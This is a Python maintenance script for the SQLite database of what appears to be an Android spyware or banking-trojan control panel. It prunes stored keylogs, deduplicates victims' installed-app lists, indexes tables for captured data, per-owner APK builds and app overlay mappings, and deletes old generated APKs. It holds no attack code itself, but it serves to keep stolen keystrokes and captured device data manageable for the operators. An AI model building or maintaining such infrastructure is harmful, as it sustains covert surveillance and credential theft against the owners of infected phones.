import sqlite3
import os
import glob
import time

base_dir = os.path.dirname(os.path.abspath(__file__))
db_file = os.path.join(base_dir, "gangstar_local.db")
if not os.path.exists(db_file):
    db_file = os.path.join(os.path.dirname(base_dir), "gangstar_local.db")

wal_file = db_file + "-wal"

print("WAL file size before:", os.path.getsize(wal_file) if os.path.exists(wal_file) else 0)
print("DB file size before:", os.path.getsize(db_file) if os.path.exists(db_file) else 0)

conn = sqlite3.connect(db_file)
cur = conn.cursor()

# 1. Checkpoint WAL
cur.execute("PRAGMA journal_mode=WAL;")
cur.execute("PRAGMA synchronous=NORMAL;")
cur.execute("PRAGMA wal_checkpoint(TRUNCATE);")

# 2. Prune old keylogs if > 150000 entries
try:
    cur.execute("SELECT count(*) FROM device_logs WHERE log_type = 'KEYLOG';")
    total_keylogs = cur.fetchone()[0]
    print("Total keylogs before prune:", total_keylogs)

    if total_keylogs > 150000:
        cur.execute("""
            DELETE FROM device_logs 
            WHERE log_type = 'KEYLOG' 
              AND id NOT IN (
                  SELECT id FROM device_logs WHERE log_type = 'KEYLOG' ORDER BY created_at DESC LIMIT 150000
              );
        """)
        conn.commit()
        cur.execute("SELECT count(*) FROM device_logs WHERE log_type = 'KEYLOG';")
        print("Pruned old keylogs. Remaining:", cur.fetchone()[0])
except Exception as e:
    print("Aviso ao prunar keylogs:", e)

# 3. Prune duplicate INSTALLED_APPS_CACHE logs keeping only latest per device
try:
    cur.execute("""
        DELETE FROM device_logs
        WHERE log_type = 'INSTALLED_APPS_CACHE'
          AND id NOT IN (
              SELECT MAX(id) FROM device_logs WHERE log_type = 'INSTALLED_APPS_CACHE' GROUP BY device_id
          );
    """)
    conn.commit()
    print("Pruned old INSTALLED_APPS_CACHE entries.")
except Exception as e:
    print("Aviso ao prunar INSTALLED_APPS_CACHE:", e)

# 4. Create high-speed composite indexes
print("Creating composite indexes...")
cur.execute("CREATE INDEX IF NOT EXISTS idx_devices_id ON devices(device_id);")
cur.execute("CREATE INDEX IF NOT EXISTS idx_devices_owner_online_seen ON devices(owner_id, is_online, last_seen);")
cur.execute("CREATE INDEX IF NOT EXISTS idx_device_logs_dev_type_created ON device_logs(device_id, log_type, created_at DESC);")
cur.execute("CREATE INDEX IF NOT EXISTS idx_device_logs_dev_created_desc ON device_logs(device_id, created_at DESC);")
cur.execute("CREATE INDEX IF NOT EXISTS idx_device_logs_type_created_desc ON device_logs(log_type, created_at DESC);")
cur.execute("CREATE INDEX IF NOT EXISTS idx_apk_builds_build_owner ON apk_builds(build_id, owner_id);")
cur.execute("CREATE INDEX IF NOT EXISTS idx_captured_data_dev_type ON captured_data(device_id, data_type);")
cur.execute("CREATE INDEX IF NOT EXISTS idx_overlay_mappings_dev_pkg ON device_overlay_mappings(device_id, package_name);")
conn.commit()

# 5. Execute VACUUM to reclaim disk space & compact DB
try:
    print("Running VACUUM to compact database file...")
    cur.execute("VACUUM;")
    print("VACUUM completed successfully.")
except Exception as e:
    print("Aviso ao executar VACUUM:", e)

# 6. Optimize & Final WAL checkpoint
cur.execute("PRAGMA optimize;")
cur.execute("PRAGMA wal_checkpoint(TRUNCATE);")
conn.close()

# 7. Clean up old generated APK files (> 2 days old)
downloads_dir = os.path.join(base_dir, "downloads")
if os.path.exists(downloads_dir):
    now = time.time()
    two_days_sec = 2 * 24 * 3600
    cleaned_apks = 0
    for apk_path in glob.glob(os.path.join(downloads_dir, "*.apk")):
        try:
            if now - os.path.getmtime(apk_path) > two_days_sec:
                os.remove(apk_path)
                cleaned_apks += 1
        except Exception:
            pass
    if cleaned_apks > 0:
        print(f"Cleaned {cleaned_apks} old APK files from downloads.")

print("DB file size after:", os.path.getsize(db_file) if os.path.exists(db_file) else 0)
print("WAL file size after:", os.path.getsize(wal_file) if os.path.exists(wal_file) else 0)

